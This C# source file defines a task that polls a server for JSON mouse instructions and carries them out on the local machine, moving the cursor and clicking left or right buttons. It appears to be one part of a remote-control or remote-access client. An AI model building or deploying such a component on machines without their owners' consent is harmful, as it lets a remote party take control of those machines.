using System.IO;
using System.Threading;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using System.Drawing;
using System.Windows.Forms;
using System.Net;

namespace IDK {

    /// <summary>
    /// Task that controls the mouse
    /// </summary>
    class MouseTask : Task {

        // Mouse object to control the mouse
        private Mouse Mouse;

        /// <summary>
        /// Class constructor
        /// </summary>
        public MouseTask() : base(Config.GetInstance().Settings.MOUSE_INSTRUCTION_UPDATE_INTERVAL) {}

        /// <summary>
        /// Method that gets called before the execution of the task to perform necessary initialization
        /// </summary>
        public override void Initialize() {
            Mouse = new Mouse();
        }

        /// <summary>
        /// Method that gets called when the task needs to update (in this case, when mouse instructions need to be fetched from the server and executed)
        /// </summary>
        public override void Update() {
            try {
                using (WebResponse webResponse = Network.MakeHttpRequest(Config.SERVER_BASE_URL + "mouse_instructions/instructions.json", "GET")) {
                    using (StreamReader reader = new StreamReader(webResponse.GetResponseStream())) {
                        string response = reader.ReadToEnd();

                        // if the length of the response is 0 then there are no mouse instructions
                        if (response.Length == 0) {
                            return;
                        } else {
                            // parse mouse instructions from json and execute them
                            JavaScriptSerializer parser = new JavaScriptSerializer();
                            List<MouseInstruction> instructions = parser.Deserialize<List<MouseInstruction>>(response);
                            ExecuteInstructions(instructions);
                        }
                    }
                }
            } catch {
                Thread.Sleep(Config.CONNECTION_DELAY);
                Update();
            }
        }

        /// <summary>
        /// Executes mouse instructions
        /// </summary>
        /// <param name="instructions">list of instructions to execute</param>
        private void ExecuteInstructions(List<MouseInstruction> instructions) {
            foreach (MouseInstruction instruction in instructions) {
                if (instruction.Delay > 0) {
                    Thread.Sleep(instruction.Delay);
                }
                
                if (instruction.Name.Equals("MOVE")) {
                    ExecuteMoveInstruction(instruction);
                } else if (instruction.Name.Equals("CLICK")) {
                    ExecuteClickInstruction(instruction);
                }
            }
        }

        /// <summary>
        /// Executes a mouse move instruction
        /// </summary>
        /// <param name="instruction">instruction to execute</param>
        private void ExecuteMoveInstruction(MouseInstruction instruction) {
            try {
                Rectangle screenBounds = Screen.PrimaryScreen.Bounds;

                int x = int.Parse(instruction.Extras["x"]);
                int y = int.Parse(instruction.Extras["y"]);

                if ((x >= 0 && x <= screenBounds.Width) && (y >= 0 && y <= screenBounds.Height)) {
                    Mouse.SetPosition(x, y);
                }
            } catch { }
        }

        /// <summary>
        /// Executes a mouse click instruction
        /// </summary>
        /// <param name="instruction">instruction to execute</param>
        private void ExecuteClickInstruction(MouseInstruction instruction) {
            string buttonToClick = instruction.Extras["button"];

            if (buttonToClick.Equals("LEFT")) {
                Mouse.Event(Mouse.MOUSE_EVENT_LEFTDOWN);
                Mouse.Event(Mouse.MOUSE_EVENT_LEFTUP);
            } else if (buttonToClick.Equals("RIGHT")) {
                Mouse.Event(Mouse.MOUSE_EVENT_RIGHTDOWN);
                Mouse.Event(Mouse.MOUSE_EVENT_RIGHTUP);
            }
        }


        /// <summary>
        /// Class that holds a mouse instruction that can be executed
        /// </summary>
        private class MouseInstruction {

            // name of the instruction
            public string Name { get; set; }

            // extra information for the instruction
            public Dictionary<string, string> Extras { get; set; }

            // delay before the execution of the instruction
            public int Delay { get; set; }
        }
    }
}
